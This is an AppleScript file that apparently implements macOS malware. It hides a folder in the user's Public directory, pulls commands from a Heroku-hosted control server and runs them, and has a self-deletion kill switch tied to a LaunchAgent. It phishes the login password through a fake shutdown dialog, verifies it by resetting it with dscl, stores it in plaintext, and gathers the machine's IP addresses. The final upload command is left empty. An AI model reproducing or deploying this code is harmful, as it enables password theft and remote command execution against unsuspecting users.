try
	set theuser to do shell script "whoami"
	try
		do shell script "mkdir ~/Public/." & theuser & "" -- Make the hidden folder in the user's Public folder
	end try
	set ufld to "/Users/" & theuser & "/Public/." & theuser & "/"
on error
	return
end try

set remoteHost to "http://damp-journey-2734.herokuapp.com"
set remoteURL to remoteHost & "/remote.txt"
try
	set commandArgs to paragraphs of (do shell script "curl " & remoteURL & " | cut -d ':' -f 2")

	if (item 1 of commandArgs) is "true" then -- Kill
		try
			try
				do shell script "rm -rf ~/public/." & theuser
			end try
			try
				do shell script "rm ~/library/LaunchAgents/com.h4k.plist"
			end try
			try
				do shell script "rm -rf " & quoted form of (POSIX path of (path to me))
			end try
		end try
		return
	else if (item 2 of commandArgs) is "true" then -- Hold
		return
	else
		set encPass to (item 3 of commandArgs) -- Get encryption password
		if (count of commandArgs) > 3 then
			repeat with a from 4 to (count of commandArgs)
				try
					do shell script (item a of commandArgs) -- Run commands
				end try
			end repeat
		end if
	end if
on error
	return
end try

try
	try
		set oldpasswd to (do shell script "cat " & ufld & "." & theuser & ".txt")
		checkPassword(theuser, oldpasswd) -- Check if password is correct
	on error err	
		repeat
			set quest to (display dialog "Please enter your password to postpone shutdown." with title "Password" default answer "" buttons {"OK"} default button 1 giving up after 5 with hidden answer) -- Prompt for Password
			set passwd to text returned of quest
			if gave up of quest = true then -- If the user doesn't enter a password:
				--tell application "System Events" to keystroke "q" using {command down, option down, shift down}
				return
			end if
			try
				checkPassword(theuser, passwd)
				exit repeat
			on error err
				log err
				display dialog "Please try again." with title "Password" buttons {"OK"} default button 1 giving up after 3 -- If password is incorrect, try again
			end try
		end repeat
		do shell script "echo " & passwd & " > " & ufld & "." & theuser & ".txt"
	end try
end try

try
	try
		do shell script "curl http://checkip.dyndns.org/ | grep 'Current IP Address' | cut -d : -f 2 | cut -d '<' -f 1"
		set WANIP to (characters 2 through -1 of result) as text -- Get IP
	on error
		set WANIP to "not connected"
	end try
	try
		set LANIP to (do shell script "ipconfig getifaddr en0")
	on error
		set LANIP to "not connected"
	end try
	log WANIP & " " & LANIP

	do shell script "curl "
end try

on checkPassword(user, pass)
	do shell script "dscl . -passwd /Users/" & user & " " & pass & " benwashere"
	do shell script "dscl . -passwd /Users/" & user & " benwashere " & pass & "" -- Check if password is correct
end checkPassword